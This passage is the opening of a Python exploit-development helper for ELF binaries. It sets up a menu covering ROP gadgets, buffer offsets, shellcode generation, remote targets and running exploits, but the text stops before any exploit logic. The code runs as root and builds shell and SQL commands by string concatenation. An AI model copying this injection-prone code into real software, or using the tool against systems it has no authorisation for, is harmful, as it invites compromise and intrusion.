#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#              PYTHON3 SCRIPT FILE FOR THE LOCAL ANALYSIS OF ELF FILES
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import r2pipe
import sqlite3
import pyfiglet
import linecache

from termcolor import colored

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : Create functional subroutines called from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def cutLine(variable1, variable2):
   command("sed -i '/" + variable1 + "/d' ./" + variable2)
   return
   
def parsFile(variable):
   command("sed -i '/^$/d' ./" + variable)
   return      
      
def lineCount(variable):
   command("cat " + variable + " | wc -l > counter.tmp")
   with open("counter.tmp","r") as counter:
      count = counter.readline()
   return int(count)

def spacePadding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value]
   while len(variable) < value:
      variable += " "
   return variable  
     
def command(variable):
   if bugHunt == 1:
      print(colored(variable, colour5))
   os.system(variable)
   return 
 
def prompt():
   null = input("\nPress ENTER to continue...")
   return   
   
def catsFile(variable):
   counter = lineCount(variable)
   if counter > 0:
      command("echo '" + Green + "'")
      command("cat " + variable)
      command("echo '" + Reset + "'")
   return   
   
def clearClutter():
   command("rm *.tmp")
   linecache.clearcache()
   return
   
def dispBanner(variable,flash):
   ascii_banner = pyfiglet.figlet_format(variable).upper()
   ascii_banner = ascii_banner.rstrip("\n")
   if flash == 1:
      command("clear")
      print(colored(ascii_banner,colour0, attrs=['bold']))
   command("pyfiglet " + variable + " > banner.tmp")
   return
   
def saveParams():
   command("echo '" + FIL + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RAX + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + COM + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RBX + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RCX + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")   
   command("echo '" + RDX + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RSI + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RDI + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RSP + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RBP + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RIP + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")   
   command("echo '" + OFF + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")   
   command("echo '" + IND + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + ARC + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + SRT + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")  
   command("echo '" + MAN + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")   
   command("echo '" + JMP + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CUS + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   
   parsFile("base64.tmp")
   
   FIL2 = linecache.getline("base64.tmp", 1).rstrip("\n")     
   RAX2 = linecache.getline("base64.tmp", 2).rstrip("\n")  
   COM2 = linecache.getline("base64.tmp", 3).rstrip("\n")
   RBX2 = linecache.getline("base64.tmp", 4).rstrip("\n")
   RCX2 = linecache.getline("base64.tmp", 5).rstrip("\n")
   RDX2 = linecache.getline("base64.tmp", 6).rstrip("\n")
   RSI2 = linecache.getline("base64.tmp", 7).rstrip("\n")
   RDI2 = linecache.getline("base64.tmp", 8).rstrip("\n")
   RSP2 = linecache.getline("base64.tmp", 9).rstrip("\n")
   RBP2 = linecache.getline("base64.tmp", 10).rstrip("\n")
   RIP2 = linecache.getline("base64.tmp", 11).rstrip("\n")
   OFF2 = linecache.getline("base64.tmp", 12).rstrip("\n")
   IND2 = linecache.getline("base64.tmp", 13).rstrip("\n")
   ARC2 = linecache.getline("base64.tmp", 14).rstrip("\n")
   SRT2 = linecache.getline("base64.tmp", 15).rstrip("\n")    
   MAN2 = linecache.getline("base64.tmp", 16).rstrip("\n")    
   JMP2 = linecache.getline("base64.tmp", 17).rstrip("\n")
   CUS2 = linecache.getline("base64.tmp", 18).rstrip("\n")
        
   cursor.execute("UPDATE REMOTETARGET SET FIL = \"" + FIL2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET RAX = \"" + RAX2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET COM = \"" + COM2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET RBX = \"" + RBX2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET RCX = \"" + RCX2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET RDX = \"" + RDX2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET RSI = \"" + RSI2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET RDI = \"" + RDI2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET RSP = \"" + RSP2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET RBP = \"" + RBP2 + "\" WHERE IDS = 1"); connection.commit()   
   cursor.execute("UPDATE REMOTETARGET SET RIP = \"" + RIP2 + "\" WHERE IDS = 1"); connection.commit()	
   cursor.execute("UPDATE REMOTETARGET SET OFF = \"" + OFF2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET IND = \"" + IND2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET ARC = \"" + ARC2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET SRT = \"" + SRT2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET MAN = \"" + MAN2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET JMP = \"" + JMP2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET CUS = \"" + CUS2 + "\" WHERE IDS = 1"); connection.commit()
   return     

def dispMenu():
   print('\u2554' + ('\u2550')*36 + '\u2566' + ('\u2550')*20 + '\u2566' + ('\u2550')*47 + '\u2566' + ('\u2550')*58 + '\u2557')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " PROGRAM REGISTERS " + (" ")*17 + '\u2551' + " CHECKSEC DATA      " + '\u2551' + " " + colored("OFFSET",colour5) + (" ")*14 + colored("FUNCTIONS ",colour5) + colored(funcNum[:7],colour6) + (" ")*9 + '\u2551' + (" ")*1 + colored("OFFSET",colour5) + " "*14 + colored("GADGETS ",colour5) + colored(gadgNum[:7],colour6) + (" ")*22 + '\u2551') 
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2560' + ('\u2550')*15+ '\u2566' + ('\u2550')*20 + '\u256C' + ('\u2550')*20 + '\u256C' + ('\u2550')*24 + '\u2550' + ('\u2550')*22 + '\u256C' + ('\u2550')*58 + '\u2563')   
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " START ADDRESS " + '\u2551', end=' ')
   if SRT[:18] == "0x0000000000000000":
      print(colored(SRT[:COL1],colour7), end=' ')
   else:
      print(colored(SRT[:COL1],colour6), end=' ')
   if "RELRO    unknown" in RE:
      print('\u2551' + " " + colored(RE,colour7) + " " +  '\u2551', end=' ')
   else:
      print('\u2551' + " " + colored(RE,colour6) + " " +  '\u2551', end=' ')
   if (MAN.rstrip(" ") in FUNC[0]):
      print(colored(FUNC[0],colour3), end=' ')
   else:
      print(colored(FUNC[0],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[0],colour3), end=' ')
   print('\u2551')      
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " MAIN  ADDRESS " + '\u2551', end=' ')
   if MAN[:18] == "0x0000000000000000":
      print(colored(MAN[:COL1],colour7), end=' ')
   else:
      print(colored(MAN[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if "No Canary" in ST:
      print(colored(ST,'blue'), end=' ')
   else:
      if "STACK    unknown" in ST:
         print(colored(ST ,colour7), end=' ')
      else:
         print(colored(ST ,colour6), end=' ')      
   print('\u2551', end=' ')
   if (MAN.rstrip(" ") in FUNC[1]):
      print(colored(FUNC[1],colour3), end=' ')
   else:
      print(colored(FUNC[1],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[1],colour6), end=' ')
   print('\u2551')   
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " SYSTEMADDRESS " + '\u2551', end=' ')
   if RCX[:18] == "0x0000000000000000":
      print(colored(RCX[:COL1],colour7), end=' ')
   else:
      print(colored(RCX[:COL1],colour6), end=' ')
   if "FORTIFY  unknown" in FO:
      print('\u2551' + " " + colored(FO,colour7) + " " +  '\u2551', end=' ')
   else:
      print('\u2551' + " " + colored(FO,colour6) + " " +  '\u2551', end=' ')   
   if (MAN.rstrip(" ") in FUNC[2]):
      print(colored(FUNC[2],colour3), end=' ')
   else:
      print(colored(FUNC[2],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[2],colour6), end=' ')
   print('\u2551')   
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " JUMP  ADDRESS " + '\u2551', end=' ')
   if JMP[:18] == "0x0000000000000000":
      print(colored(JMP,colour7), end=' ')
   else:
      print(colored(JMP,colour6), end=' ')      
   print('\u2551', end =' ')      
   if "NX      Disabled" in NX:
      print(colored(NX,'blue'), end=' ')
   else:
      if "NX       unknown" in NX:
         print(colored(NX,colour7), end=' ')      
      else:
         print(colored(NX,colour6), end=' ')            
   print('\u2551', end=' ')      
   if (MAN.rstrip(" ") in FUNC[3]):
      print(colored(FUNC[3],colour3), end=' ')
   else:
      print(colored(FUNC[3],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[3],colour6), end=' ')
   print('\u2551')   
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " TEST  ADDRESS " + '\u2551', end=' ')
   if CUS[:18] == "0x0000000000000000":
      print(colored(CUS[:COL1],colour7), end=' ')
   else:
      print(colored(CUS[:COL1],colour6), end=' ')      
   print('\u2551', end=' ')
   if "No PIE" in PI:
      print(colored(PI,'blue'), end=' ')
   else:
      if "PIE      unknown" in PI:
         print(colored(PI ,colour7), end=' ')   
      else:
         print(colored(PI ,colour6), end=' ')         
   print('\u2551', end=' ')
   if (MAN.rstrip(" ") in FUNC[4]):
      print(colored(FUNC[4],colour3), end=' ')
   else:
      print(colored(FUNC[4],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[4],colour6), end=' ')
   print('\u2551')   
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " POP RDI ; RET " + '\u2551', end=' ')
   if RDI[:18] == "0x0000000000000000":
      print(colored(RDI,colour7), end=' ')
   else:
      print(colored(RDI,colour6), end=' ')   
   print('\u2551', end =' ')      
   if "RWX     Segments" in RW:
      print(colored(RW,'blue'), end=' ')
   else:
      if "RWX      unknown" in RW:
         print(colored(RW,colour7), end=' ')      
      else:
         print(colored(RW,colour6), end=' ')            
   print('\u2551', end=' ')   
   if (MAN.rstrip(" ") in FUNC[5]):
      print(colored(FUNC[5],colour3), end=' ')
   else:
      print(colored(FUNC[5],colour6), end=' ')   
   print('\u2551', end=' ')
   print(colored(GADD[5],colour6), end=' ')
   print('\u2551')           
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " UNALLOCATED   " + '\u2551', end=' ')
   if RAX[:18] == "0x0000000000000000":
      print(colored(RAX,colour7), end=' ')
   else:
      print(colored(RAX,colour6), end=' ')         
   print('\u2560' + ('\u2550')*20 + '\u2563', end= ' ')    
   if (MAN.rstrip(" ") in FUNC[6]):
      print(colored(FUNC[6],colour3), end=' ')
   else:
      print(colored(FUNC[6],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[6],colour6), end=' ')
   print('\u2551')   
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " UNALLOCATED   " + '\u2551', end=' ') 
   if RBX[:18] == "0x0000000000000000":
      print(colored(RBX,colour7), end=' ')
   else:
      print(colored(RBX,colour6), end=' ')      
   print('\u2551',end=' ')
   print("BUFFER   OVERFLOW  " + '\u2551', end= ' ')     
   if (MAN.rstrip(" ") in FUNC[7]):
      print(colored(FUNC[7],colour3), end=' ')
   else:
      print(colored(FUNC[7],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[7],colour6), end=' ')
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " UNALLOCATED   " + '\u2551', end=' ')
   if RDX[:18] == "0x0000000000000000":
      print(colored(RDX,colour7), end=' ')
   else:
      print(colored(RDX,colour6), end=' ')         
   print('\u2560' + ('\u2550')*20 + '\u2563', end= ' ')    
   if (MAN.rstrip(" ") in FUNC[8]):
      print(colored(FUNC[8],colour3), end=' ')
   else:
      print(colored(FUNC[8],colour6), end=' ')      
   print('\u2551', end=' ')   
   print(colored(GADD[8],colour6), end=' ')
   print('\u2551')   
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " RSP/ESP/SP/SL " + '\u2551', end=' ')
   if RSP[:18] == "0x0000000000000000":
      print(colored(RSP,colour7), end=' ')
   else:
      print(colored(RSP,colour6), end=' ')            
   print('\u2551', end=' ')   
   if OFF[:1] == "0":
      print(colored("OFFSET   " + OFF[:9],colour7), end=' ')
      print('\u2551', end=' ')
   else:
      print(colored("OFFSET   " + OFF[:9],colour2), end=' ')
      print('\u2551', end=' ')        
   if (MAN.rstrip(" ") in FUNC[9]): 
      print(colored(FUNC[9],colour3), end=' ')
   else:
      print(colored(FUNC[9],colour6), end=' ')      
   print('\u2551', end=' ')   
   print(colored(GADD[9],colour6), end=' ')
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " RBP/EBP/BP/BL " + '\u2551', end=' ')
   if RBP[:18] == "0x0000000000000000":
      print(colored(RBP,colour7), end=' ')
   else:
      print(colored(RBP,colour6), end=' ')
   print('\u2551', end=' ') 
   if BITS[:6] == "64-Bit":
      print(colored("        -08 Bytes ",colour2), end=' ')
   if BITS[:6] == "32-Bit":
      print(colored("        -04 Bytes ",colour2), end=' ')
   if BITS[:7] == "unknown":
      print(colored("         0 Bytes  ",colour7), end=' ')
   print('\u2551', end=' ')   
   if (MAN.rstrip(" ") in FUNC[10]):
      print(colored(FUNC[10],colour3), end=' ')
   else:
      print(colored(FUNC[10],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[10],colour6), end=' ')
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -     
   print('\u2551', end=' ')
   if BITS[:7] != "unknown" and OFF[:1] != "0":
      print("RIP/EIP", end=' ')
      print(colored("====>", colour2,attrs=['blink']), end=' ')
   else:
      print("RIP/EIP      ", end=' ')   
   print('\u2551', end=' ')      
   if RIP[:18] == "0x0000000000000000":
      if BITS[:7] != "unknown" and OFF[:1] != "0":
         print(colored(RIP,colour2), end=' ')     
      else:
         print(colored(RIP,colour7), end=' ')
   else:
      print(colored(RIP,colour6), end=' ')
   print('\u2551', end=' ') 
   if BITS[:6] == "64-Bit":
      if BITS[:7] != "unknown" and OFF[:1] != "0":
         print(colored("<=====", colour2,attrs=['blink']), end=' ')
      else:
         print("      ", end=' ')   
      print(colored(" -08 Bytes ",colour2), end=' ')
   if BITS[:6] == "32-Bit":
      print(colored("        -04 Bytes ",colour2), end=' ')
   if BITS[:7] == "unknown":
      print(colored("         0 Bytes  ",colour7), end=' ')
   print('\u2551', end=' ')   
   if (MAN.rstrip(" ") in FUNC[11]):
      print(colored(FUNC[11],colour3), end=' ')
   else:
      print(colored(FUNC[11],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[11],colour6), end=' ')
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + " CUST  ADDRESS " + '\u2551', end=' ')     
   if RSI[:18] == "0x0000000000000000":
      print(colored(RSI,colour7), end=' ')
   else:
      print(colored(RSI,colour6), end=' ')
   print('\u2551', end=' ')     
   if OFF2[:1] == "0":
      print(colored("ADJUSTED",colour7),end=' ')
   else:
      print(colored("ADJUSTED",colour2),end=' ')      
   if OFF2[:1] == "0":
      print(colored(OFF2[:9],colour7),end=' ')
   else:
      print(colored(OFF2[:9],colour2),end=' ')   
   print('\u2551', end= ' ')
   if (MAN.rstrip(" ") in FUNC[12]):
      print(colored(FUNC[12],colour3), end=' ')
   else:
      if FUNC[13] != "":
         print(colored(FUNC[12],colour0), end=' ')   
      else:
         print(colored(FUNC[12],colour6), end=' ')
   print('\u2551', end=' ')
   if GADD[13] != "":
      print(colored(GADD[12],colour0), end=' ')
   else:
      print(colored(GADD[12],colour6), end=' ')
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2560' + ('\u2550')*15 + '\u2569' + ('\u2550')*20 + '\u2569' + ('\u2550')*20 + '\u2569' + ('\u2550')*24 + '\u2550' + ('\u2550')*22 + '\u256C' + ('\u2550')*58 + '\u2563')
   return
   
def options():
   print('\u2551' + "(01) Set STARTADDRESS (11) Set BASE POINTER (21) Read  PrivHead (31) MSF PatternCreate (41) RESERVED     " + '\u2551' + " REMOTE FILE INFORMATION " + (" ")*33 + '\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(02) Set MAIN ADDRESS (12) Set INST POINTER (22) Read  Sections (32) Program Interface (42) RESERVED     " + '\u2560' + ('\u2550')*58 + '\u2563')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(03) Set SYST ADDRESS (13) Set CUST ADDRESS (23) Read   Headers (33) L-Trace Interface (43) RESERVED     " + '\u2551' + " FILE NAME      ", end=' ')
   if FIL[:7] == "unknown":
      print(colored(FIL[:COL3-16],colour7), end=' ')   
   else:
      print(colored(FIL[:COL3-16],colour6), end=' ')
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(04) Set JUMP ADDRESS (14) Select  FILENAME (24) ReadExecutable (34) G.D.B.  Interface (44) NASMShellcode" + '\u2551' + " FORMAT         ", end=' ')
   if COM[:7] != "unknown":
      print(colored(COM,colour6), end=' ')
   else:
      print(colored(COM,colour7), end=' ')  
   print("MODE   ", end=' ') 
   if MODE[:7] == "unknown":
      print(colored(MODE[:COL1-5],colour7), end=' ')
   else:
      print(colored(MODE[:COL1-5],colour6), end=' ') 
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(05) Set TEST ADDRESS (15) Switch File Mode (25) Read DeBugInfo (35) MSF PatternSearch (45) MSF Shellcode" + '\u2551' + " ARCHITECTURE   ", end= ' ')
   if ARC[:7] == "unknown":
      print(colored(ARC,colour7), end=' ')
   else:
      print(colored(ARC,colour6), end=' ')
   print("FLAVOUR", end=' ')
   print(colored(flavour[:5],colour6),end=' ' )
   print((" ")*8 + '\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(06) Set POP RDI &RET (16) Examine  Program (26) Read Assembley (36) Set Buffer OFFSET (46) RESERVED     " + '\u2551' + " BITS           ", end=' ')
   if BITS[:1] != "u":
      print(colored(BITS,colour6), end=' ')
   else:
      print(colored(BITS,colour7), end=' ')   
   print("INDIAN ", end=' ')       
   if IND[:7] == "unknown":
      print(colored(IND[:COL1-5],colour7), end=' ')
   else:
      print(colored(IND[:COL1-5],colour6), end=' ')  
   print('\u2551')  
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(07) Set  UNALLOCATED (17) CheckSec Program (27) Read   Symbols (37) Adjust the OFFSET (47) Set I.P./Port" + '\u2551' + " LIBC VERSION   ", end=' ')
   if LIBC[:7] == "unknown":
      print(colored(LIBC[:COL2-5],colour7), end=' ')
   else:
      print(colored(LIBC[:COL2-5],colour6), end=' ')
   print('\u2551') 
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(08) Set  UNALLOCATED (18) G.D.B. Functions (28) Read Stab Data (38) Dis-Assemble MAIN (48) Write Exploit" + '\u2551' + " "  + (" ")*COL3 + " " + '\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(09) Set  UNALLOCATED (19) Radar2 Functions (29) Read HexFormat (39) Dis-Assemble FUNC (49) Run Exploit  " + '\u2551' + " "  + (" ")*COL3 + " " + '\u2551')
   print('\u2551' + "(10) Set STACKPOINTER (20) Find all Gadgets (30) HexCode Editor (40) Dis-Assemble ADDR (50) Exit         " + '\u2551'  " REMOTE ADDRESS ", end=' ')
   if remAddr[:7] == "unknown":
      print(colored(remAddr,colour7), end=' ')
   else:
      print(colored(remAddr,colour6), end=' ')
   print("PORT   ", end=' ')
   if remPort[:7] == "unknown":
      print(colored(remPort[:13],colour7),end=' ' )
   else:
      print(colored(remPort[:13],colour6),end=' ' )   
   print('\u2551')   
   print('\u255A' + ('\u2550')*105 + '\u2569' +  ('\u2550')*58 + '\u255D') #colored("VALUE",colour5)
   return

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : START OF MAN - Check running as root.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
   print("\n[*] Please run this python3 script as root...")
   exit(1)
else:
   bugHunt = 0  
    
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : Create local user-friendly variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

maxDispl = 14
localDir = "BINMASTER"
flavour = "intel"

colour0 = "red"
colour1 = "grey"
colour2 = "cyan"
colour3 = "blue"
colour4 = "black"
colour5 = "white"
colour6 = "green"
colour7 = "yellow"
colour8 = "magenta"

Yellow  = '\e[1;93m'
Green   = '\e[0;32m'
Red     = '\e[1;91m'
Reset   = '\e[0m'
      
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Display program banner and boot system.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

command("xdotool key Alt+Shift+S; xdotool type 'BINARY MASTER'; xdotool key Return")
dispBanner("BINARY MASTER",1)
print(colored("\t\t    F U L L  S T A C K  E D I T I O N",colour7,attrs=['bold']))
print(colored("\n\n[*] Booting, please wait...", colour3))

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : Initialise program files and variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.path.exists(localDir):
   print("[+] Directory " + localDir + " already exists...")
else:
   print("[+] Creating directory " + localDir + "...")
   command("mkdir " + localDir)
  
if os.path.exists(localDir + "/RA.db"):
   pass
else:
   print("[+] Creatng new database...")
   try:
      command("cp RA.db ./" + localDir + "/RA.db")
      print("[+] Copying database...")
   except:
      print(colored("[!] WARNING!!! - RA.db missing, unable to create new database...", colour0))

if os.path.exists(localDir + "/RA.db"):
   print("[+] Connecting to database...")
   connection = sqlite3.connect(localDir + "/RA.db")
   cursor = connection.cursor()
else:
   print(colored("[!] WARNING!!! - " + localDir + "/RA.db missing, unable to connect to database...", colour0))
   exit(1)
                  
print("[+] Populating system variables...")

COL1 = 18
COL2 = 45
COL3 = 56
LEN1 = 0

FUNC = [" "*COL2]*maxDispl
GADD = [" "*COL3]*maxDispl

# NEW VARIABLES THAT NEED TO BE ADDED TO THE DATABASE

RE = spacePadding("RELRO    unknown", COL1)
ST = spacePadding("STACK    unknown", COL1)
FO = spacePadding("FORTIFY  unknown", COL1)
NX = spacePadding("NX       unknown", COL1)
PI = spacePadding("PIE      unknown", COL1)
RW = spacePadding("RWX      unknown", COL1)


BITS = spacePadding("unknown", COL1)
MODE = spacePadding("unknown", COL1)
OFF2 = spacePadding("0 Bytes", COL1)
LIBC = spacePadding("unknown", COL2)


method = spacePadding("stack", COL1)
stages = spacePadding("incomplete", COL1)

remAddr = spacePadding("unknown", COL1)
remPort = spacePadding("unknown", COL1)
funcNum = spacePadding(" ", COL1)
gadgNum = spacePadding(" ", COL1)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : Check the database for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

print("[+] Configuration database found - restoring saved data....")
col = cursor.execute("SELECT * FROM REMOTETARGET WHERE IDS = 1").fetchone()
command("echo " + col[1]  + " | base64 -d >  ascii.tmp")
command("echo " + col[2]  + " | base64 -d >> ascii.tmp")
command("echo " + col[3]  + " | base64 -d >> ascii.tmp")
command("echo " + col[4]  + " | base64 -d >> ascii.tmp")
command("echo " + col[5]  + " | base64 -d >> ascii.tmp")
command("echo " + col[6]  + " | base64 -d >> ascii.tmp")
command("echo " + col[7]  + " | base64 -d >> ascii.tmp")
command("echo " + col[8]  + " | base64 -d >> ascii.tmp")
command("echo " + col[9]  + " | base64 -d >> ascii.tmp")
command("echo " + col[10] + " | base64 -d >> ascii.tmp")
command("echo " + col[11] + " | base64 -d >> ascii.tmp")
command("echo " + col[12] + " | base64 -d >> ascii.tmp")
command("echo " + col[13] + " | base64 -d >> ascii.tmp")
command("echo " + col[14] + " | base64 -d >> ascii.tmp")
command("echo " + col[15] + " | base64 -d >> ascii.tmp")
command("echo " + col[16] + " | base64 -d >> ascii.tmp")
command("echo " + col[17] + " | base64 -d >> ascii.tmp")
command("echo " + col[18] + " | base64 -d >> ascii.tmp")

FIL = linecache.getline("ascii.tmp", 1).rstrip("\n")
RAX = linecache.getline("ascii.tmp", 2).rstrip("\n")
COM = linecache.getline("ascii.tmp", 3).rstrip("\n")
RBX = linecache.getline("ascii.tmp", 4).rstrip("\n")
RCX = linecache.getline("ascii.tmp", 5).rstrip("\n")
RDX = linecache.getline("ascii.tmp", 6).rstrip("\n")
RSI = linecache.getline("ascii.tmp", 7).rstrip("\n")
RDI = linecache.getline("ascii.tmp", 8).rstrip("\n")
RSP = linecache.getline("ascii.tmp", 9).rstrip("\n")
RBP = linecache.getline("ascii.tmp", 10).rstrip("\n")
RIP = linecache.getline("ascii.tmp", 11).rstrip("\n")
OFF = linecache.getline("ascii.tmp", 12).rstrip("\n")
IND = linecache.getline("ascii.tmp", 13).rstrip("\n")
ARC = linecache.getline("ascii.tmp", 14).rstrip("\n")
SRT = linecache.getline("ascii.tmp", 15).rstrip("\n")
MAN = linecache.getline("ascii.tmp", 16).rstrip("\n")
JMP = linecache.getline("ascii.tmp", 17).rstrip("\n")
CUS = linecache.getline("ascii.tmp", 18).rstrip("\n")

FIL = spacePadding(FIL, COL3)
RAX = spacePadding(RAX, COL1)
COM = spacePadding(COM, COL1)
RBX = spacePadding(RBX, COL1)
RCX = spacePadding(RCX, COL1)
RDX = spacePadding(RDX, COL1)
RSI = spacePadding(RSI, COL1)
RDI = spacePadding(RDI, COL1)
RSP = spacePadding(RSP, COL1)
RBP = spacePadding(RBP, COL1)
RIP = spacePadding(RIP, COL1)
OFF = spacePadding(OFF, COL1)
